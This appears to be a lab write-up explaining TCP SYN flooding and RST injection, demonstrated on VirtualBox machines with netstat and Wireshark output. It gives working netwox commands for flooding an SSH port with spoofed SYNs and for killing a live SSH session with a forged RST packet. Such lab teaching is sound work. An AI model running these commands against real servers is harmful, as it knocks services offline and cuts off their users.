# TCP Attacks

## Description

TCP is a protocol in the Transport Layer that works on top of the IP Layer. It provides a way for network nodes to communicate realiably and guarranties the order and the consistency of the delivered messages. To achieve this communication, both ends require to maintain a connection.

Although internet applications such as the email, file transfer, HTTP etc. rely on TCP, it has no security mechanism built into the protocol. The messages are not protected so an attacker can read them, manipulate and change them, insert fake data and hijack connections.

Here, we will show some of the methods that can be used to attack a TCP connection such as:

- SYN flooding
- Reset attack
- Session hijack

## Attacks

### SYN flooding
With SYN flood, the attacker tries to consume enough resources of the attacked machine in order to make it unresponsive to legitimate users.

When a new TCP connection is attempted the client and the server exchange 3 messages

1. Client: `SYN` 
2. Server: `SYN+ACK`
3. Client: `ACK`

<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Tcp_normal.svg/1920px-Tcp_normal.svg.png" width="50%">


The first `SYN` informs the server that a client wants to establish a new connection. The server stores this request in a queue and the connection is called a *half-open connection*. When the third step (the client sending the `ACK` ) is completed the request is removed from this queue.

In this attack, the queue of the half-open connections is used to make the server unresponsive to new clients. The attacker sends a lot of `SYN` without replying `ACK`, filling the queue and binding resources of the server. When a legitimate client tries to connect to the server, the server will not be able to accept new `SYN` packets.

<img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Tcp_synflood.png" width="50%">

#### Preparation

In order to perform a SYN flooding attack, we created 2 virtual machines in VirtualBox, one for the server and the other for a client.
The role of the attacker is given to the host machine.

<img src="https://spanagiot.gr/networks/vms.png" width="50%">

To demonstrate this attack, we need to turn off the protection enabled by default (in Debian based OSes) using the command
```bash
sysctl -w net.ipv4.tcp_syncookies=0
```

To monitor the connections on the server, we will use a program called `netstat`, which is part of the `net-tools` package. Using the command `netstat -tna` we can see all the current active TCP connections on the machine.

```
user@server:~$ netstat -tna
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 10.2.1.16:22            10.2.1.5:59831          ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN
```

As we can see, our machine is listening for SSH connections and the `ESTABLISHED` is an SSH connection from the host to the VM. We can also see that we don't have any `SYN_RECV` state. In normal situations there won't be many half-open connections.

To perform the attack we will use the `netwox` package which includes a tool that can launch a SYN flooding attack (tool number 76).

```
Title: Synflood
Usage: netwox 76 -i ip -p port [-s spoofip]
Parameters:
 -i|--dst-ip ip                 destination IP address {5.6.7.8}
 -p|--dst-port port             destination port number {80}
 -s|--spoofip spoofip           IP spoof initialization type {linkbraw}
 --help2                        display full help
Example: netwox 76 -i "5.6.7.8" -p "80"
Example: netwox 76 --dst-ip "5.6.7.8" --dst-port "80"
```

#### Attack

We want to target the SSH server running at the port 22 and the address of the machine is `10.2.1.16`. So, to perform the attack we need to execute

```bash
netwox 76 -i 10.2.1.16 -p 22 -s raw
```

After running this command, we execute again the `netstat` command on the server to see what is going on.

```
user@server:~$ netstat -tna
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 10.2.1.16:22            142.65.213.19:8969      SYN_RECV
tcp        0      0 10.2.1.16:22            42.82.247.152:23656     SYN_RECV
tcp        0      0 10.2.1.16:22            21.74.47.152:40124      SYN_RECV
tcp        0      0 10.2.1.16:22            219.199.203.189:16719   SYN_RECV
tcp        0      0 10.2.1.16:22            25.30.122.237:58762     SYN_RECV
tcp        0      0 10.2.1.16:22            8.107.205.103:57390     SYN_RECV
tcp        0      0 10.2.1.16:22            218.215.44.80:61166     SYN_RECV
tcp        0      0 10.2.1.16:22            190.69.210.6:22369      SYN_RECV
tcp        0      0 10.2.1.16:22            5.244.215.162:14775     SYN_RECV
tcp        0      0 10.2.1.16:22            111.93.83.52:57612      SYN_RECV
tcp        0      0 10.2.1.16:22            164.243.64.220:8708     SYN_RECV
tcp        0      0 10.2.1.16:22            27.189.25.159:18512     SYN_RECV
tcp        0      0 10.2.1.16:22            66.77.120.164:23110     SYN_RECV
tcp        0      0 10.2.1.16:22            81.225.85.217:25157     SYN_RECV
tcp        0      0 10.2.1.16:22            118.36.20.88:37156      SYN_RECV
tcp        0      0 10.2.1.16:22            131.13.233.59:2758      SYN_RECV
tcp        0      0 10.2.1.16:22            145.136.144.151:65212   SYN_RECV
tcp        0      0 10.2.1.16:22            122.252.244.20:31515    SYN_RECV
tcp        0      0 10.2.1.16:22            5.49.25.115:48337       SYN_RECV
```

The list of `SYN_RECV` connections is larger but it would be unecessary to show it all. We can see that all these connections target the port 22 and the foreign address looks random. After leaving this tool running for a couple of seconds, the server will not be able to receive new TCP connections.

We can verify this by trying to open a new SSH from the client.

```bash
user@client:~$ ssh user@10.2.1.16
ssh: connect to host 10.2.1.16 port 22: Operation timed out
```

We need to specify here that this attack will only affect the port 22 and the SSH service. If telnet was running on port 23 it would not be affected because the each port has its own connection queue. Also, the server will continue operating normally, without any indication that an attack is happening.

### RST attack
There are two ways to terminate and established TCP connection between two hosts (let's call them A and B). The first way is done with A informing B that it wants to terminate the connection by sending a `FIN` packet and expects and `ACK` from B. If B wants also to terminate his side of the connection (because TCP connections are two one-way "pipes") can also send a `FIN` packet and after `ACK` is received the connection is considered closed.
The second way is for host A to send a `RST` packet. The `RST` packet will indicate to the receiving host that the connection should be terminated immediately. It is used in situations where there is no time to close the connection using the `FIN` packets and when there are errors detected in the connection.
Using the `RST` packet, an attacker can terminate an established connection without the consent of any of the legitimate users.

#### Preparation
We will use again 3 machines, one VM and the host as the legitimate users and the other VM as the attacker (see preparation in the previous attack).

#### Attack
Considering we know everything about the current connection between the server and the client (both source and destination IP and port number), we need to guess the sequence number because if it's not considered valid by the receiver our(the attacker's) packet will be discarded.
We will use wireshark to monitor the traffic between the two users and find the sequence number.
We will also use again the `netwox` program and the tool number 40 which can be used to send any TCP package.

```bash
user@client:~$ netwox 40 --help
Title: Spoof Ip4Tcp packet
Usage: netwox 40 [-c uint32] [-e uint32] [-f|+f] [-g|+g] [-h|+h] [-i uint32] [-j uint32] [-k uint32] [-l ip] [-m ip] [-n ip4opts] [-o port] [-p port] [-q uint32] [-r uint32] [-s|+s] [-t|+t] [-u|+u] [-v|+v] [-w|+w] [-x|+x] [-y|+y] [-z|+z] [-A|+A] [-B|+B] [-C|+C] [-D|+D] [-E uint32] [-F uint32] [-G tcpopts] [-H mixed_data]
Parameters:
 -l|--ip4-src ip                IP4 src {10.2.1.27}
 -m|--ip4-dst ip                IP4 dst {5.6.7.8}
 -o|--tcp-src port              TCP src {1234}
 -p|--tcp-dst port              TCP dst {80}
 -q|--tcp-seqnum uint32         TCP seqnum (rand if unset) {0}
 -B|--tcp-rst|+B|--no-tcp-rst   TCP rst
 --help2                        display help for advanced parameters
 ```
 (We removed all the unused options from the parameters list because the list was huge)

By monitoring the connection in Wireshark, we can see the current sequence numbers, and we can use them to predict the next one. TCP has a certain "window" so we don't need to be extremely accurate.
Here are the connections to the server

```bash
user@server:~$ netstat -tna
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 10.2.1.16:22            10.2.1.5:52494          ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN
```

and here is the latest sequence number as captured by Wireshark (Wireshark shows by default the relative sequence number and we need to turn it off)

<img src="https://spanagiot.gr/networks/wireshark_seq.png" >

By inspecting the other packets we can see that the sequence number increases by 36 almost every time, so 1806966531+36=1806966567 will be our guess.

We launch the attack by running
```bash
netwox 40 -l 10.2.1.5 -m 10.2.1.16 -o 52494 -p 22 -B -q 1806966567
```

If we guess correctly, we will see on the client connected to the server this message
```bash
user@server:~$ packet_write_wait: Connection to 10.2.1.16 port 22: Broken pipe
```
which indicates that our attack was successful!
